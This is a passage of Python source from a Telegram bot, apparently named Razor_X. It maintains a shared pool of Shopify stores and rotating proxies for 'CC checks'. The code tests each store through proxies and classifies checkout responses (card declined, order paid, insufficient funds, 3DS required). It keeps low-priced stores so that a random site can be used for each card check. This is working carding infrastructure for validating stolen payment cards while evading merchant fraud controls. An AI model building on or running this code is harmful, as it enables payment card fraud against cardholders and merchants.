        return uid not in ACTIVE_ADD_PROCESSES

    async def update_ui(force=False):
        now = time.time()
        if not force and now - last_ui[0] < _get_ui_interval():
            return
        async with ui_lock:
            last_ui[0] = now
            try:
                await styled_edit(sm, f"""⭐ {bs('Testing Sites...')}
━━━━━━━━━━━━━━━━━

⭐ {bs('Working ━')} {working}
⭐ {bs('Added To DB ━')} {added_to_db}/{total}
⭐ {bs('Dead ━')} {dead}
⭐ {bs('Tested ━')} {tested}/{total}
⭐ {bs('Total ━')} {total}

⭐ {bs('Only sites with price in range will be added.')}""", emoji_ids=[
                    5325834523068342417,
                    5278622189556354905,
                    6266967801580231067,
                    5042112436648281096,
                    5215327832040811010,
                    5980995951160987855,
                    5852670420074893746,
                ])
            except:
                pass

    async def test_worker(site):
        nonlocal tested, working, dead, added_to_db
        async with _SITE_SEM:
            if is_stopped():
                return
            try:
                proxy_data = random.choice(proxies) if proxies else None
                res = await test_site(site, proxy_data)
                tested += 1
                if res['status'] == 'alive':
                    working += 1
                    price_val = 0
                    price_str = res.get('price', '-')
                    if price_str and price_str != '-':
                        try:
                            price_val = float(str(price_str).replace('$', '').strip())
                        except:
                            price_val = 0
                    working_sites_data.append({'site': site, 'response': res.get('response', '-'), 'price': price_str, 'price_val': price_val})
                    if price_val <= max_price:
                        if await add_global_site(site):
                            added_to_db += 1
                            log_user(uid, "ADD_SITE_OK", f"Site={site} | Price=${price_val} | Added to shared Shopify pool")
                        else:
                            log_user(uid, "ADD_SITE_DUP", f"Site={site} | Already in shared Shopify pool")
                    else:
                        log_user(uid, "ADD_SITE_SKIP", f"Site={site} | Price=${price_val} > MaxPrice=${max_price}")
                else:
                    dead += 1
                    log_user(uid, "ADD_SITE_DEAD", f"Site={site} | Response={res.get('response', '')[:60]}")
                fire_and_forget(update_ui())
            except Exception as e:
                dead += 1
                tested += 1
                log_user(uid, "ADD_SITE_TEST_ERR", f"Site={site} | Error={e}", "error")

    await asyncio.gather(*[asyncio.create_task(test_worker(s)) for s in new_sites])

    log_user(uid, "ADD_TEST_DONE", f"Working={working} | Dead={dead} | AddedToDB={added_to_db} | MaxPrice=${max_price}")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"Razor_X_add_results_{ts}.txt"
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"Total working Sites - {working}\n")
            await f.write("═" * 30 + "\n")
            for d in working_sites_data:
                resp = d['response']
                price = d['price']
                ru = resp.upper() if resp else ''
                if 'CARD_DECLINED' in ru:
                    tag = "{CARD_DECLINED}"
                elif 'ORDER_PAID' in ru:
                    tag = "{ORDER_PAID}"
                elif 'GENERIC_ERROR' in ru:
                    tag = "{GENERIC_ERROR}"
                elif '3DS_REQUIRED' in ru:
                    tag = "{3DS_REQUIRED}"
                elif 'INSUFFICIENT_FUNDS' in ru:
                    tag = "{INSUFFICIENT_FUNDS}"
                elif 'DO_NOT_HONOR' in ru:
                    tag = "{DO_NOT_HONOR}"
                elif 'FRAUD' in ru or 'SUSPECTED' in ru:
                    tag = "{FRAUD_SUSPECTED}"
                elif 'CVC' in ru or 'CVV' in ru:
                    tag = "{INCORRECT_CVC}"
                elif 'GENERIC_DECLINE' in ru:
                    tag = "{GENERIC_DECLINE}"
                else:
                    tag = "{" + resp[:30].replace('{', '').replace('}', '') + "}"
                if price and price != '-':
                    pc2 = str(price).replace('$', '')
                    try:
                        ps2 = f"(${round(float(pc2), 2)})"
                    except:
                        ps2 = f"(${pc2})"
                else:
                    ps2 = "($0.00)"
                url = f"https://{d['site']}" if not d['site'].startswith('http') else d['site']
                await f.write(f"{url}  {tag}   {ps2}\n")
    except:
        pass

    try:
        await styled_edit(sm, f"""⭐{bs('Sites Checking Complete!')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Working ━')} {working}
⭐ {bs('Dead ━')} {dead}
⭐ {bs(f'Added To DB (0-${max_price}) ━')} {added_to_db}
⭐ {bs('Already Existed ━')} {len(already_exists)}
⭐ {bs('Total Tested ━')} {total}

⭐ {bs('Random')} site will be {bs('used for each CC check.')}""", emoji_ids=[
            5278622189556354905,
            5278622189556354905,
            5042112436648281096,
            5855207143724027916,
            5134452506935427991,
            5980995951160987855,
            5852670420074893746,
        ])
    except:
        pass

    if working_sites_data:
        try:
            await styled_send(chat_id, f"⭐ {bs('Working Sites')} ({bs(str(working))})", emoji_ids=[5278622189556354905], file=fn)
        except:
            pass
    try:
        os.remove(fn)
    except:
        pass

    ACTIVE_ADD_PROCESSES.pop(uid, None)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    uid = event.sender_id

    if not rt:
        return await styled_reply(event, f"""⭐ <code>/rm site.com</code>
⭐ <code>/rm all</code> ━ {bs('remove all sites')}""", emoji_ids=[
            4902715076873553054, 5042112436648281096
        ])

    if rt.lower() == 'all':
        PENDING_RM_SITES[uid] = {"mode": "all", "sites": [], "event": event}
        kb = [
            [pbtn(bs("Shopify"), f"rmgate:shopify:{uid}", color="blue")],
        ]
        return await styled_reply(event, f"""⭐  {bs('Confirm')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Action')} → {bs('Remove ALL sites')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Shopify')} → {bs('clear shared Shopify pool')}""", buttons=kb, emoji_ids=[
            5855207143724027916,
            4902715076873553054,
            4902715076873553054,
        ])

    to_rm = extract_urls_from_text(rt)
    if not to_rm:
        return await styled_reply(event, f"⭐ {bs('No URLs found')}", emoji_ids=[5042112436648281096])

    new_sites, seen = [], set()
    for site in to_rm:
        n = normalize_site_url(site)
        if n and n not in seen:
            seen.add(n)
            new_sites.append(n)
    if not new_sites:
        return await styled_reply(event, f"⭐ {bs('No valid sites found')}", emoji_ids=[5042112436648281096])

    PENDING_RM_SITES[uid] = {"mode": "sites", "sites": new_sites, "event": event}
    kb = [
        [pbtn(bs("Shopify"), f"rmgate:shopify:{uid}", color="blue")],
    ]
    await styled_reply(event, f"""⭐  {bs('Confirm')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Sites parsed ━')} {len(new_sites)}
━━━━━━━━━━━━━━━━━
⭐ {bs('Shopify')} → {bs('remove from shared Shopify pool')}""", buttons=kb, emoji_ids=[
        5855207143724027916,
        4902715076873553054,
        5980995951160987855,
    ])


async def _rm_match_and_delete(uid, gate, targets):
    """Remove normalized target sites from the chosen gate pool.
    Returns (removed_list, not_found_list)."""
    removed, nf = [], []
    existing = await get_shopify_sites()
    by_norm = {}
    for ex in existing:
        n = normalize_site_url(ex)
        if n and n not in by_norm:
            by_norm[n] = ex
    for n in targets:
        ex = by_norm.get(n)
        if ex and await remove_global_site(ex):
            removed.append(ex)
        else:
            nf.append(n)
    return removed, nf


async def _rm_clear_all(uid, gate):
    """Clear entire pool for gate. Returns removed count."""
    return await clear_global_sites()


@client.on(events.CallbackQuery(pattern=rb"rmgate:(shopify):(\d+)"))
async def rm_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_RM_SITES.pop(uid, None)
    if not data:
        return await event.answer(f"{bs('Expired')}!", alert=True)

    mode = data.get("mode") or "sites"
    src = data.get("event") or event
    gate_label = "Shopify"

    if mode == "all":
        removed_count = await _rm_clear_all(uid, gate)
        if removed_count == 0:
            await event.answer(f"{bs('No sites to remove')}", alert=True)
            try:
                await event.delete()
            except Exception:
                pass
            return await styled_reply(src, f"⭐ {bs('No sites to remove')} ({bs(gate_label)})", emoji_ids=[5042112436648281096])
        log_user(uid, "RM_ALL_SITES", f"Gate={gate_label} | Removed={removed_count}")
        await event.answer(f"{bs('Removed')} ✓")
        try:
            await event.delete()
        except Exception:
            pass
        eids = [5278622189556354905, 5042112436648281096]
        return await styled_reply(src, f"""⭐{bs('All Sites Removed')} ({bs(gate_label)})
━━━━━━━━━━━━━━━━━
⭐ {bs('Removed ━')} <code>{removed_count}</code> {bs('sites')}""", emoji_ids=eids)

    targets = list(data.get("sites") or [])
    if not targets:
        return await event.answer(f"{bs('No sites')}!", alert=True)

    removed, nf = await _rm_match_and_delete(uid, gate, targets)
    log_user(uid, "RM_SITE", f"Gate={gate_label} | Removed={len(removed)} | NotFound={len(nf)}")
    await event.answer(f"{bs('Done')}")
    try:
        await event.delete()
    except Exception:
        pass

    parts, eid = [], []
    if removed:
        parts.append("\n".join(f"⭐ {bs('Removed ━')} <code>{s}</code>" for s in removed))
        eid.extend([5278622189556354905] * len(removed))
    if nf:
        parts.append("\n".join(f"⭐ {bs('Not found ━')} <code>{s}</code> ({bs(gate_label)})" for s in nf))
        eid.extend([5042112436648281096] * len(nf))
    await styled_reply(
        src,
        "\n\n".join(parts) if parts else f"⭐ {bs('None removed')} ({bs(gate_label)})",
        emoji_ids=eid or [5042112436648281096],
    )


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    await _send_sites_list(event, "shopify")


async def _send_sites_list(event, gate: str, edit_msg=None):
    uid = event.sender_id
    sites = await get_shopify_sites()
    title = f"Shopify Sites ({len(sites)}/{MAX_SITES})"
    empty_text = NO_SITES_UI_TEXT
    check_data = f"checkgate:shopify:{uid}"
    rotate_note = bs("Shared pool used for all users.")

    if not sites:
        if edit_msg:
            text, entities = build_entities(empty_text, emoji_ids=NO_SITES_UI_EMOJIS)
            try:
                await edit_msg.edit(text, formatting_entities=entities, buttons=None, link_preview=False)
            except Exception:
                pass
            return
        return await reply_no_sites(event)

    text = f"""⭐ {bs(title)}
━━━━━━━━━━━━━━━━━
"""
    eid = [5980995951160987855]
    for i, s in enumerate(sites[:10], 1):
        text += f"⭐ {bs(f'{i}. {s}')}\n"
        eid.append(5084974483685507801)
    if len(sites) > 10:
        text += f"⚡ {bs(f'... {len(sites) - 10} more')}\n"
        eid.append(4902715076873553054)
    text += f"\n⚡ {rotate_note}"
    eid.append(5852670420074893746)
    kb = [[pbtn(bs("Check Sites"), data=check_data, color="blue", icon=5435934308894258303)]]
    if edit_msg:
        text2, entities = build_entities(text, emoji_ids=eid)
        try:
            await edit_msg.edit(text2, formatting_entities=entities, buttons=kb, link_preview=False)
        except Exception:
            pass
        return
    await styled_reply(event, text, buttons=kb, emoji_ids=eid)


@client.on(events.CallbackQuery(pattern=rb"listgate:(shopify):(\d+)"))
async def list_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    await event.answer()
    await _send_sites_list(event, gate, edit_msg=await event.get_message())


async def run_check_sites_flow(event, edit_msg=None, gate=None):
    uid = event.sender_id
    if not is_owner(uid):
        if edit_msg:
            return await event.answer(f"{bs('Owner only command!')}", alert=True)
        return await send_owner_only_message(event)

    gate = "shopify"

    sites = await get_shopify_sites()
    if not sites:
        if edit_msg:
            return await event.answer(f"{bs('No sites')}!", alert=True)
        return await reply_no_sites(event)

    PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event, "gate": "shopify"}

    kb = [
        [pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}", color="blue"), pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}", color="blue")],
        [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}", color="blue"), pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}", color="blue")]
    ]
    
    text = f"""⭐  {bs('Select Price Range')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Total Sites ━')} {len(sites)}
━━━━━━━━━━━━━━━━━
⭐ {bs('Dead sites will be removed')}
⭐ {bs('Alive sites outside price range will also be removed')}"""

    emojis = [
        5855207143724027916,
        4902715076873553054,
        5042112436648281096,
        5980995951160987855,
    ]

    if edit_msg:
        await styled_edit(edit_msg, text, buttons=kb, emoji_ids=emojis)
    else:
        await styled_reply(event, text, buttons=kb, emoji_ids=emojis)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    await run_check_sites_flow(event)


@client.on(events.CallbackQuery(pattern=rb"check_sites_cb"))
async def check_sites_callback_cb(event):
    if not is_owner(event.sender_id):
        return await event.answer(f"{bs('Owner only command!')}", alert=True)
    await event.answer(f"{bs('Processing')}...")
    await run_check_sites_flow(event, edit_msg=event.message)


@client.on(events.CallbackQuery(pattern=rb"checkgate:(shopify):(\d+)"))
async def check_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    await event.answer()
    data = PENDING_SITE_CHECK.get(uid) or {}
    src_event = data.get("event") or event
    msg = await event.get_message()
    await run_check_sites_flow(src_event, edit_msg=msg, gate=gate)


@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data:
        return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking sites')}...")
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))


async def _process_site_check(event, sites, max_price):
    uid = event.sender_id
    total = len(sites)
    tested = 0
    alive_count = 0
    dead_count = 0
    kept_count = 0
    removed_price = 0
    chat_id = event.chat_id

    proxies = await get_all_user_proxies(uid, gate="shopify")

    log_user(uid, "SITE_CHK_START", f"Checking {total} sites | MaxPrice=${max_price} | Proxies={len(proxies)}")

    sm = await styled_reply(event, f"""⭐ {bs('Checking Sites...')}
━━━━━━━━━━━━━━━━━

⭐ {bs('Working ━')} 0
⭐ {bs('Added To DB ━')} 0/{total}
⭐ {bs('Dead ━')} 0
⭐ {bs('Tested ━')} 0/{total}
⭐ {bs('Total ━')} {total}

⭐ {bs('Only sites with price in range will be added.')}""", emoji_ids=[
        5325834523068342417,
        5278622189556354905,
        6266967801580231067,
        5042112436648281096,
        5215327832040811010,
        5980995951160987855,
        5852670420074893746,
    ])

    last_ui = [0]
    ui_lock = asyncio.Lock()
    alive_sites_data = []
    dead_sites = set()
    price_removed_sites = set()

    async def update_ui(force=False):
        now = time.time()
        if not force and now - last_ui[0] < _get_ui_interval():
            return
        async with ui_lock:
            last_ui[0] = now
            try:
                await styled_edit(sm, f"""⭐ {bs('Testing Sites...')}
━━━━━━━━━━━━━━━━━

⭐ {bs('Working ━')} {alive_count}
⭐ {bs('Added To DB ━')} {kept_count}/{total}
⭐ {bs('Dead ━')} {dead_count}
⭐ {bs('Tested ━')} {tested}/{total}
⭐ {bs('Total ━')} {total}

⭐ {bs('Only sites with price in range will be added.')}""", emoji_ids=[
                    5325834523068342417,
                    5278622189556354905,
                    6266967801580231067,
                    5042112436648281096,
                    5215327832040811010,
                    5980995951160987855,
                    5852670420074893746,
                ])
            except:
                pass

    async def check_worker(site):
        nonlocal tested, alive_count, dead_count, kept_count, removed_price
        async with _SITE_SEM:
            try:
                proxy_data = random.choice(proxies) if proxies else None
                res = await test_site(site, proxy_data)
                tested += 1

                if res['status'] == 'alive':
                    alive_count += 1
                    price_val = 0
                    price_str = res.get('price', '-')
                    if price_str and price_str != '-':
                        try:
                            price_val = float(str(price_str).replace('$', '').strip())
                        except:
                            price_val = 0

                    if price_val <= max_price:
                        kept_count += 1
                        alive_sites_data.append({'site': site, 'response': res.get('response', '-'), 'price': price_str, 'price_val': price_val})
                        log_user(uid, "SITE_ALIVE_KEPT", f"Site={site} | Price=${price_val} | Kept")
                    else:
                        removed_price += 1
                        price_removed_sites.add(normalize_site_url(site))
                        log_user(uid, "SITE_ALIVE_PRICED", f"Site={site} | Price=${price_val} > ${max_price} | Removing")
                else:
                    dead_count += 1
                    dead_sites.add(normalize_site_url(site))
                    log_user(uid, "SITE_DEAD", f"Site={site} | Response={res.get('response', '')[:60]}")

                fire_and_forget(update_ui())
            except Exception as e:
                dead_count += 1
                tested += 1
                dead_sites.add(normalize_site_url(site))
                log_user(uid, "SITE_CHK_ERR", f"Site={site} | Error={e}", "error")

    await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites])

    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in price_removed_sites:
            await remove_global_site(s)

    total_removed = len(dead_sites) + len(price_removed_sites)

    log_user(uid, "SITE_CHK_DONE", f"Alive={alive_count} | Kept={kept_count} | Dead={dead_count} | PriceRemoved={removed_price} | TotalRemoved={total_removed}")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"Razor_X_working_sites_{ts}.txt"
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"Total working Sites - {kept_count}\n")
            await f.write("═" * 30 + "\n")
            for d in alive_sites_data:
                resp = d['response']
                price = d['price']
                ru = resp.upper() if resp else ''
                if 'CARD_DECLINED' in ru:
                    tag = "{CARD_DECLINED}"
                elif 'ORDER_PAID' in ru:
                    tag = "{ORDER_PAID}"
                elif 'GENERIC_ERROR' in ru:
                    tag = "{GENERIC_ERROR}"
                elif '3DS_REQUIRED' in ru:
                    tag = "{OTP_REQUIRED}"
                elif 'INSUFFICIENT_FUNDS' in ru:
                    tag = "{INSUFFICIENT_FUNDS}"
                elif 'DO_NOT_HONOR' in ru:
                    tag = "{DO_NOT_HONOR}"
                elif '3D' in ru or 'AUTHENTICATION' in ru:
                    tag = "{3D_AUTHENTICATION}"
                elif 'CVC' in ru or 'CVV' in ru:
                    tag = "{CVC_CHECK}"
                elif 'GENERIC_DECLINE' in ru:
                    tag = "{GENERIC_DECLINE}"
                else:
                    tag = "{" + resp[:30].replace('{', '').replace('}', '') + "}"
                if price and price != '-':
                    pc2 = str(price).replace('$', '')
                    try:
                        ps2 = f"(${round(float(pc2), 2)})"
                    except:
                        ps2 = f"(${pc2})"
                else:
                    ps2 = "($0.00)"
                url = f"https://{d['site']}" if not d['site'].startswith('http') else d['site']
                await f.write(f"{url}  {tag}   {ps2}\n")
    except:
        pass

    try:
        kb = [[pbtn(bs("Check Sites"), data=f"checkgate:shopify:{uid}", color="blue", icon=5435934308894258303)]]
        await styled_edit(sm, f"""⭐{bs('Sites Checking Complete!')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Working ━')} {alive_count}
⭐ {bs('Dead ━')} {dead_count}
⭐ {bs(f'Added To DB (0-${max_price}) ━')} {kept_count}
⭐ {bs(f'Over Price (removed) ━')} {removed_price}
⭐ {bs('Total Tested ━')} {total}

⚡ {bs('Random site will be used for each CC check.')}""", buttons=kb, emoji_ids=[
            5278622189556354905,
            5278622189556354905,
            5042112436648281096,
            5855207143724027916,
            5134452506935427991,
            5980995951160987855,
            5852670420074893746,
        ])
    except:
        pass


    if alive_sites_data:
        try:
            await styled_send(chat_id, f"⭐ {bs('Working Sites')} ({bs(str(kept_count))})", emoji_ids=[5278622189556354905], file=fn)
        except:
            pass
    try:
        os.remove(fn)
    except:
        pass


# ====================== PROXY ======================
PROXY_USAGE_TEXT = f"""⭐ {bs('Usage')}:

⭐ <code>/addpxy host:port:user:pass</code>
⭐ {bs('Multi-line')}:
<code>/addpxy proxy1
proxy2
proxy3</code>

⭐ {bs('Or reply to a .txt file with proxies')}

⭐ {bs('Supported formats')}:
⭐ <code>host:port</code>
⭐ <code>host:port:user:pass</code>
⭐ <code>user:pass@host:port</code>
⭐ <code>socks5://user:pass@host:port</code>
⭐ <code>socks4 & http & https</code>

⭐ {bs(f'Max {MAX_PROXIES} proxies per gate (Shopify).')}"""

PROXY_USAGE_EMOJIS = [
    5855207143724027916,
    4902715076873553054,
    4902715076873553054,
    4902715076873553054,
    5084974483685507801,
    4902715076873553054,
    4902715076873553054,
    4902715076873553054,
    4902715076873553054,
    4902715076873553054,
    5980995951160987855
]

NO_PROXY_UI_TEXT = f"""⭐ <b>No Proxy Set!</b>

⭐ <b>You must add a proxy before checking CC.</b>
⭐ <b>Use: /addpxy host:port:user:pass</b>"""

NO_PROXY_UI_EMOJIS = [
    5042112436648281096,
    5855207143724027916,
    4902715076873553054,
]


def no_proxy_ui_text(gate: str = None) -> str:
    if gate == "shopify":
        return f"""⭐ <b>No Shopify Proxy Set!</b>

⭐ <b>Shopify checks use the Shopify proxy pool only.</b>
⭐ <b>Use: /addpxy → Shopify</b>"""
    return NO_PROXY_UI_TEXT

SITE_USAGE_TEXT = f"""⭐ {bs('Usage')}:

⭐ <code>/add site</code>
⭐ {bs('Multi-line')}:
<code>/add site1
site2
site3</code>

⭐ {bs('Or reply to a .txt file with sites')}

⭐ {bs('Supported formats')}:
⭐ <code>http://</code> / <code>https://</code>

⭐ {bs(f'Max {MAX_SITES} Shopify sites.')}"""

SITE_USAGE_EMOJIS = [
    5855207143724027916,
    4902715076873553054,
    4902715076873553054,
    5084974483685507801,
    4902715076873553054,
    5980995951160987855
]

async def reply_no_proxy(event, gate: str = None):
    return await styled_reply(event, no_proxy_ui_text(gate), emoji_ids=NO_PROXY_UI_EMOJIS)


NO_SITES_UI_TEXT = f"""⭐ {bs('No Sites!')}

⭐ {bs('You must add some sites before checking.')}
⭐ {bs('Use: /add site1 or reply to a .txt file with sites.')}"""

NO_SITES_UI_EMOJIS = [
    5042112436648281096,
    5855207143724027916,
    4902715076873553054
]

async def reply_no_sites(event):
    return await styled_reply(event, NO_SITES_UI_TEXT, emoji_ids=NO_SITES_UI_EMOJIS)


def _proxy_gate_label(gate: str) -> str:
    return "Shopify"


async def _parse_proxy_lines_from_event(event):
    lines = []
    if event.is_reply:
        rm = await event.get_reply_message()
        if rm and rm.file:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                    lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
            finally:
                try:
                    os.remove(fp)
                except Exception:
                    pass
        elif rm and rm.text:
            lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
    else:
        p = event.raw_text.split(maxsplit=1)
        if len(p) == 2:
            lines = [l.strip() for l in p[1].splitlines() if l.strip()]
    return lines


async def _process_add_proxies(event, parsed, gate: str):
    uid = event.sender_id
    gate_label = _proxy_gate_label(gate)
    cc = await get_proxy_count(uid, gate=gate)
    remaining_slots = MAX_PROXIES - cc
    if remaining_slots <= 0:
        return await styled_reply(event, f"⭐ {bs('Limit')} {bs(f'{MAX_PROXIES}/{MAX_PROXIES}')} ({bs(gate_label)})", emoji_ids=[5042112436648281096])
    parsed = parsed[:remaining_slots]
    log_user(uid, "ADD_PROXY_START", f"Gate={gate_label} | Testing {len(parsed)} proxies | Current={cc}/{MAX_PROXIES}")

    tm = await styled_reply(event, f"""⭐ {bs('Testing proxies...')} ({bs(gate_label)})

⭐ {bs(f'Parsed: {len(parsed)} | Testing in batches of 10...')}
⭐ {bs(f'Will stop at {remaining_slots} working proxies.')}""", emoji_ids=[
        5325834523068342417,
        5215327832040811010,
        5084974483685507801,
    ])

    added, failed = [], []
    tested_count = 0
    for i in range(0, len(parsed), 10):
        batch = parsed[i:i + 10]
        results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
        for pd2, res in zip(batch, results):
            tested_count += 1
            d = f"{pd2['ip']}:{pd2['port']}"
            proxy_url = pd2.get('proxy_url', d)
            if isinstance(res, tuple) and res[0]:
                await add_proxy_db(uid, pd2, gate=gate)
                added.append(d)
                log_user(uid, "ADD_PROXY_OK", f"Gate={gate_label} | Proxy={proxy_url} | IP={res[1]} | [{tested_count}/{len(parsed)}]")
            else:
                failed.append(d)
                err_detail = res[1] if isinstance(res, tuple) else str(res)[:80]
                log_user(uid, "ADD_PROXY_DEAD", f"Gate={gate_label} | Proxy={proxy_url} | Error={err_detail} | [{tested_count}/{len(parsed)}]", "warning")

        await styled_edit(tm, f"""⭐ {bs('Testing proxies...')} ({bs(gate_label)})

⭐ {bs(f'Working: {len(added)}/{remaining_slots}')}
⭐ {bs(f'Dead: {len(failed)}')}
⭐ {bs(f'Tested: {tested_count}/{len(parsed)}')}""", emoji_ids=[
            5325834523068342417,
            5278622189556354905,
            5042112436648281096,
            5215327832040811010,
        ])

    log_user(uid, "ADD_PROXY_DONE", f"Gate={gate_label} | Added={len(added)} | Failed={len(failed)} | Total={cc + len(added)}/{MAX_PROXIES}")

    if added:
        await styled_edit(tm, f"""⭐ {bs('Proxy Testing Complete!')} ({bs(gate_label)})

⭐ {bs(f'Working: {len(added)}')}
⭐ {bs(f'Dead: {len(failed)}')}
⭐ {bs(f'Total saved: {len(added)}/{remaining_slots}')}

⭐ {bs('Saved to')} {bs(gate_label)} {bs('proxy pool')}""", emoji_ids=[
            5278622189556354905,
            5084974483685507801,
            5042112436648281096,
            5980995951160987855,
            5852670420074893746,
        ])
    else:
        await styled_edit(tm, f"""⭐ {bs('All proxies are dead!')} ({bs(gate_label)})

⭐ {bs(f'Tested: {len(parsed)}')} | {bs('None working.')}""", emoji_ids=[
            5042112436648281096,
            5855207143724027916,
        ])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if event.is_group:
        return await styled_reply(event, f"⭐ {bs('Private only')}", emoji_ids=[5042112436648281096])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    try:
        lines = await _parse_proxy_lines_from_event(event)
        if not lines and len(event.raw_text.split(maxsplit=1)) < 2 and not event.is_reply:
            return await styled_reply(event, PROXY_USAGE_TEXT, emoji_ids=PROXY_USAGE_EMOJIS)
        if not lines:
            return await styled_reply(event, f"⭐ {bs('No proxies found')}", emoji_ids=[5042112436648281096])

        await ensure_user(event.sender_id)
        parsed, seen = [], set()
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in seen:
                parsed.append(pd)
                seen.add(pd['proxy_url'])
        if not parsed:
            return await styled_reply(event, f"⭐ {bs('No valid proxies')}", emoji_ids=[5042112436648281096])

        uid = event.sender_id
        PENDING_ADD_PROXIES[uid] = {"proxies": parsed, "event": event}
        kb = [
            [pbtn(bs("Shopify"), f"addpxygate:shopify:{uid}", color="blue")],
        ]
        await styled_reply(event, f"""⭐  {bs('Confirm')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Proxies parsed ━')} {len(parsed)}
━━━━━━━━━━━━━━━━━
⭐ {bs('Shopify')} → {bs('Shopify proxy pool')}""", buttons=kb, emoji_ids=[
            5855207143724027916,
            4902715076873553054,
            4902715076873553054,
        ])
    except Exception as e:
        log_user(event.sender_id, "ADD_PROXY_ERROR", f"Error={e}", "error")
        await styled_reply(event, f"⭐ {bs('Error ━')} <code>{e}</code>", emoji_ids=[5042112436648281096])


@client.on(events.CallbackQuery(pattern=rb"addpxygate:(shopify):(\d+)"))
async def add_proxy_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_PROXIES.pop(uid, None)
    if not data:
        return await safe_callback_answer(event, f"{bs('Expired')}!", alert=True)
    await safe_callback_answer(event, f"{bs('Testing')} {_proxy_gate_label(gate)}...")
    try:
        await event.delete()
    except Exception:
        pass

    parsed = list(data.get("proxies") or [])
    existing = {p['proxy_url'] for p in await get_all_user_proxies(uid, gate=gate)}
    parsed = [p for p in parsed if p.get('proxy_url') not in existing]
    if not parsed:
        return await styled_reply(data.get("event") or event, f"⭐ {bs('All proxies already exist')} ({bs(_proxy_gate_label(gate))})", emoji_ids=[5042112436648281096])
    asyncio.create_task(_process_add_proxies(data.get("event") or event, parsed, gate))


async def _send_proxy_list(event, gate: str, edit_msg=None):
    uid = event.sender_id
    gate_label = _proxy_gate_label(gate)
    proxies = await get_all_user_proxies(uid, gate=gate)
    if not proxies:
        msg = f"""⭐ {bs('No Proxy Set!')} ({bs(gate_label)})

⭐ {bs('Use')} <code>/addpxy</code> → {bs(gate_label)}"""
        if edit_msg:
            try:
                await styled_edit(edit_msg, msg, emoji_ids=NO_PROXY_UI_EMOJIS)
            except Exception:
                pass
            return
        return await styled_reply(event, msg, emoji_ids=NO_PROXY_UI_EMOJIS)

    text = f"""⭐ {bs(f'{gate_label} Proxies [{len(proxies)}/{MAX_PROXIES}]')}

"""
    eid = [5042101437237036298]
    for i, p in enumerate(proxies[:10], 1):
        ip = str(p.get("ip") or "")
        port = str(p.get("port") or "")
        ptype = str(p.get("proxy_type") or "http").upper()
        text += f"⭐ {bs(f'{i}. {ip}:{port} ({ptype})')}\n"
        eid.append(5084974483685507801)
    if len(proxies) > 10:
        text += f"⭐ {bs(f'... {len(proxies) - 10} more')}\n"
        eid.append(4902715076873553054)
